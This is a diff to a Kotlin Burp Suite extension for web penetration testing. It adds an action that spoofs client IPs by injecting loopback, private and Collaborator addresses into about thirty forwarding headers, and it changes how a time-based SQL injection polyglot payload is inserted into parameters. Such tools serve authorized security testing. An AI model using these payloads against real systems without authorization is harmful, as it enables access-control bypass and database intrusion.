@@ -38,7 +38,8 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
     private val collabUrlMenuItem = JMenuItem("Collab Url")
     private val log4jCollabMenuItem = JMenuItem("Log4J Collab")
     private val minimizeMenuItem = JMenuItem("Minimize")
-    private val allMenuItems = mutableListOf<Component>(sqliQuickMenuItem,sqliErrorPayloadsMenuItem,sqliConcatPayloadsMenuItem,sqliSingleQuoteCommentPayloadsMenuItem,sqliDoubleQuoteCommentPayloadsMenuItem,sqliLogicPayloadsMenuItem,xssMapMenuItem,xssPayloadsMenuItem,blindXssImgMenuItem,collabUrlMenuItem,log4jCollabMenuItem,minimizeMenuItem)
+    private val spoofIPMenuItem = JMenuItem("Spoof IP Using Headers")
+    private val allMenuItems = mutableListOf<Component>(sqliQuickMenuItem,sqliErrorPayloadsMenuItem,sqliConcatPayloadsMenuItem,sqliSingleQuoteCommentPayloadsMenuItem,sqliDoubleQuoteCommentPayloadsMenuItem,sqliLogicPayloadsMenuItem,xssMapMenuItem,xssPayloadsMenuItem,blindXssImgMenuItem,collabUrlMenuItem,log4jCollabMenuItem,spoofIPMenuItem,minimizeMenuItem)
     private var currentHttpRequestResponseList = mutableListOf<HttpRequestResponse>()
     private val executor = Executors.newVirtualThreadPerTaskExecutor()
     private lateinit var followRedirectSetting : BooleanExtensionSetting
@@ -70,6 +71,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
         minimizeMenuItem.addActionListener({ e -> minimizeActionPerformed(e) })
         log4jCollabMenuItem.addActionListener({ e -> log4jCollabActionPerformed(e) })
+        spoofIPMenuItem.addActionListener { e -> spoofIpActionPerformed(e) }
         followRedirectSetting = BooleanExtensionSetting(
             api,
             "Follow Redirects?",
@@ -112,10 +114,54 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
     }
 
 
+
+    fun spoofIpActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val collabGenerator = api.collaborator().defaultPayloadGenerator()
+
+        val spoofPayloads = listOf("127.0.0.1","0","0.0.0.0","10.0.0.2","192.168.0.2",collabGenerator.generatePayload().toString())
+        val headers = listOf("CF-Connecting-IP","Client-IP","Forwarded","Forwarded-For","Forwarded-For-Ip","From","Front-End-Https","Origin","Referer","True-Client-IP","Via","X-Azure-ClientIP","X-Azure-SocketIP","X-Client-IP","X-Custom-IP-Authorization","X-Forward","X-Forward-For","X-Forwarded","X-Forwarded-By","X-Forwarded-For","X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Proto","X-Forwarded-Server","X-Forwarded-Ssl","X-Forwared-Host","X-Host","X-HTTP-Host-Override","X-Originating-IP","X-ProxyUser-Ip","X-Real-IP","X-Remote-Addr","X-Remote-IP")
+        val justHost = listOf("Host")
+        for(spoofPayload in spoofPayloads) {
+            addOrReplacePayloadForHeaders(myHttpRequestResponses,headers,spoofPayload,"Spoof IP: $spoofPayload")
+            addOrReplacePayloadForHeaders(myHttpRequestResponses,justHost,spoofPayload,"Spoof IP, Host: $spoofPayload")
+        }
+
+        for(httpRequestResponse in myHttpRequestResponses) {
+            val resolvedIp = httpRequestResponse.httpService().ipAddress()
+            addOrReplacePayloadForHeaders(listOf(httpRequestResponse),headers,resolvedIp,"Spoof IP, Server IP: $resolvedIp")
+        }
+        logger.debugLog("Exit")
+    }
+
+    fun addOrReplacePayloadForHeaders(httpRequestResponses : List<HttpRequestResponse>,headers : List<String>, payload : String, annotation : String) {
+        logger.debugLog("Enter")
+        for(httpRequestResponse in httpRequestResponses)
+        {
+            var currentHttpRequest = httpRequestResponse.request()
+            logger.debugLog("Found request: ${currentHttpRequest.url()}")
+
+
+            for(header in headers) {
+                logger.debugLog("Adding header: $header, ${payload}")
+                if(currentHttpRequest.hasHeader(header)) {
+                    currentHttpRequest = currentHttpRequest.withUpdatedHeader(header,payload)
+                }
+                else {
+                    currentHttpRequest = currentHttpRequest.withAddedHeader(header,payload)
+                }
+
+            }
+            sendRequest(currentHttpRequest,annotation)
+        }
+        logger.debugLog("Exit")
+    }
+
     fun sqliQuickActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadUpdateMode.APPEND, "SQLi Polyglot \"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadUpdateMode.REPLACE, "SQLi Polyglot \"")
         logger.debugLog("Exit")
     }
 
@@ -378,72 +424,11 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         logger.debugLog("Exit")
     }
 
-    /*fun createUpdatedParameter(parsedParameter : ParsedHttpParameter,encodedPayload : String) : HttpParameter {
-        logger.debugLog("Enter")
-        return HttpParameter.parameter(parsedParameter.name(),encodedPayload,parsedParameter.type())
-    }*/
-
     fun createUpdatedParameter(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : HttpParameter {
         logger.debugLog("Enter")
         return HttpParameter.parameter(parsedParameter.name(), insertPayloadAccordingToType(parsedParameter,encodedPayload,payloadType), parsedParameter.type())
     }
 
-    /*fun matchReplaceParameterInRequest(originalRequest : HttpRequest ,parsedParameter : ParsedHttpParameter,encodedPayload : String) : HttpRequest {
-        return originalRequest.withBody(originalRequest.bodyToString().replace(parsedParameter.value(),encodedPayload))
-    }*/
-
-    /*
-    fun matchReplaceParameterInRequest(originalRequest : HttpRequest ,parsedParameter : ParsedHttpParameter,encodedPayload : String, payloadType : PayloadType) : HttpRequest {
-
-        //find updated parsed parameter
-
-        var updatedParsedParam = originalRequest.parameters().find { it.name()==parsedParameter.name() && it.type() == parsedParameter.type() && it.value()==parsedParameter.value() }
-
-        if(updatedParsedParam!=null) {
-            val requestAsString = originalRequest.toString()
-
-            when (payloadType) {
-                PayloadUpdateMode.PREPEND -> {
-                    val part1 = requestAsString.substring(0, updatedParsedParam.valueOffsets().startIndexInclusive())
-                    val part2 = requestAsString.substring(updatedParsedParam.valueOffsets().startIndexInclusive() + 1)
-                    return HttpRequest.httpRequest(originalRequest.httpService(), part1 + encodedPayload + part2)
-                }
-
-                PayloadUpdateMode.INSERT_MIDDLE -> {
-                    val middleIndexDiff =
-                        (updatedParsedParam.valueOffsets().endIndexExclusive() - updatedParsedParam.valueOffsets()
-                            .startIndexInclusive()) / 2
-                    if (middleIndexDiff > 1) {
-                        val part1 = requestAsString.substring(
-                            0,
-                            updatedParsedParam.valueOffsets().startIndexInclusive() + middleIndexDiff
-                        )
-                        val part2 = requestAsString.substring(
-                            updatedParsedParam.valueOffsets().startIndexInclusive() + middleIndexDiff + 1
-                        )
-                        return HttpRequest.httpRequest(originalRequest.httpService(), part1 + encodedPayload + part2)
-                    }
-                    val part1 = requestAsString.substring(0, updatedParsedParam.valueOffsets().startIndexInclusive())
-                    val part2 = requestAsString.substring(updatedParsedParam.valueOffsets().startIndexInclusive() + 1)
-                    return HttpRequest.httpRequest(originalRequest.httpService(), part1 + encodedPayload + part2)
-                }
-
-                PayloadUpdateMode.APPEND -> {
-                    val part1 = requestAsString.substring(0, updatedParsedParam.valueOffsets().endIndexExclusive())
-                    val part2 = requestAsString.substring(updatedParsedParam.valueOffsets().endIndexExclusive())
-                    return HttpRequest.httpRequest(originalRequest.httpService(), part1 + encodedPayload + part2)
-                }
-
-                else -> {
-                    val part1 = requestAsString.substring(0, updatedParsedParam.valueOffsets().startIndexInclusive())
-                    val part2 = requestAsString.substring(updatedParsedParam.valueOffsets().endIndexExclusive())
-                    return HttpRequest.httpRequest(originalRequest.httpService(), part1 + encodedPayload + part2)
-                }
-            }
-        }
-        return originalRequest
-    }
-*/
     fun insertPayloadAccordingToType(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : String {
         when (payloadType) {
             PayloadUpdateMode.PREPEND -> return encodedPayload + parsedParameter.value()
